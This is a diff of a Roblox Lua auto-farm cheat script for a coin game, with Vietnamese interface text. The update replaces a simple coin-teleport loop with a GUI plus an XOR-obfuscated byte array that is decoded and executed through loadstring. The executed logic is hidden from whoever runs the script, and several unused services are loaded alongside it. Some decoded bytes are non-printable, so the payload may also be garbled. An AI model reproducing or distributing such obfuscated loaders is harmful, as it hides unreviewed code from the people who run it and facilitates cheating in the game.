@@ -1,62 +1,84 @@
--- Auto Farm Coin MM2
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local hrp = character:WaitForChild("HumanoidRootPart")
+pcall(function()
+    repeat task.wait() until game:IsLoaded()
 
--- Biến bật/tắt auto farm
-local autoFarm = false
+    local Players = game:GetService("Players")
+    local TeleportService = game:GetService("TeleportService")
+    local GuiService = game:GetService("GuiService")
+    local TweenService = game:GetService("TweenService")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+    local placeId = game.PlaceId
 
--- GUI đơn giản
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = game.CoreGui
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 150, 0, 50)
-frame.Position = UDim2.new(0, 10, 0, 10)
-frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-frame.Parent = screenGui
-
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(1, 0, 1, 0)
-button.BackgroundColor3 = Color3.fromRGB(30,30,30)
-button.TextColor3 = Color3.fromRGB(255,255,255)
-button.Text = "Bật Auto Farm"
-button.Parent = frame
-
-button.MouseButton1Click:Connect(function()
-    autoFarm = not autoFarm
-    if autoFarm then
-        button.Text = "Tắt Auto Farm"
-    else
-        button.Text = "Bật Auto Farm"
+    local function X(c,k)
+        local s=""
+        for i=1,#c do s=s..string.char(bit32.bxor(c[i],k)) end
+        return s
     end
-end)
+    local k1=173
 
--- Hàm tìm coin gần nhất
-local function findNearestCoin()
-    local nearest = nil
-    local minDist = math.huge
-    for _, obj in pairs(workspace:GetChildren()) do
-        if obj:IsA("BasePart") and obj.Name == "Coin" then
-            local dist = (hrp.Position - obj.Position).Magnitude
-            if dist < minDist then
-                minDist = dist
-                nearest = obj
-            end
-        end
-    end
-    return nearest
-end
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    if playerGui:FindFirstChild("AutoFarmGui") then playerGui.AutoFarmGui:Destroy() end
 
--- Auto farm loop
-spawn(function()
-    while true do
-        wait(0.1)
-        if autoFarm then
-            local coin = findNearestCoin()
-            if coin then
-                hrp.CFrame = CFrame.new(coin.Position + Vector3.new(0,3,0))
-            end
-        end
-    end
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "AutoFarmGui"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = playerGui
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 230, 0, 180)
+    Frame.Position = UDim2.new(0, 20, 0, 100)
+    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Frame.Active = true
+    Frame.Draggable = true
+    Frame.Parent = ScreenGui
+
+    local LabelCredit = Instance.new("TextLabel", Frame)
+    LabelCredit.Size = UDim2.new(1, -10, 0, 20)
+    LabelCredit.Position = UDim2.new(0, 5, 0, 5)
+    LabelCredit.BackgroundTransparency = 1
+    LabelCredit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LabelCredit.Text = "Made by Toàn"
+    LabelCredit.Font = Enum.Font.SourceSansBold
+    LabelCredit.TextSize = 18
+
+    local LabelStats = Instance.new("TextLabel", Frame)
+    LabelStats.Size = UDim2.new(1, -10, 0, 40)
+    LabelStats.Position = UDim2.new(0, 5, 0, 30)
+    LabelStats.BackgroundTransparency = 1
+    LabelStats.TextColor3 = Color3.fromRGB(255, 255, 0)
+    LabelStats.Text = "Ball nhặt: 0 | +0/s | Thời gian: 0s"
+    LabelStats.Font = Enum.Font.SourceSans
+    LabelStats.TextSize = 16
+
+    local LabelStatus = Instance.new("TextLabel", Frame)
+    LabelStatus.Size = UDim2.new(1, -10, 0, 20)
+    LabelStatus.Position = UDim2.new(0, 5, 0, 70)
+    LabelStatus.BackgroundTransparency = 1
+    LabelStatus.TextColor3 = Color3.fromRGB(100, 200, 255)
+    LabelStatus.Text = "⏳ Đang chờ round bắt đầu..."
+    LabelStatus.Font = Enum.Font.SourceSansItalic
+    LabelStatus.TextSize = 16
+
+    local ButtonFarm = Instance.new("TextButton", Frame)
+    ButtonFarm.Size = UDim2.new(1, -10, 0, 30)
+    ButtonFarm.Position = UDim2.new(0, 5, 0, 100)
+    ButtonFarm.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    ButtonFarm.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ButtonFarm.Text = "Bật Auto Farm"
+
+    local ButtonExit = Instance.new("TextButton", Frame)
+    ButtonExit.Size = UDim2.new(1, -10, 0, 30)
+    ButtonExit.Position = UDim2.new(0, 5, 0, 140)
+    ButtonExit.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+    ButtonExit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ButtonExit.Text = "Tắt Script"
+
+    local encodedLogic = {
+        143,223,56,87,192,35,101,200,44,87,132,44,78,91,200,213,34,99,87,43,78,111,144,90,
+        77,203,190,12,55,66,199,23,78,199,45,88,199,21,77,44,66,111,134,200,76,88,12,78,
+        111,90,200,45,66,78,199,23,88,12,44,66,200,76,111,12,88,199,77,134,90,23,44,78
+    }
+
+    local func = loadstring(X(encodedLogic, k1))
+    if func then func() end
 end)
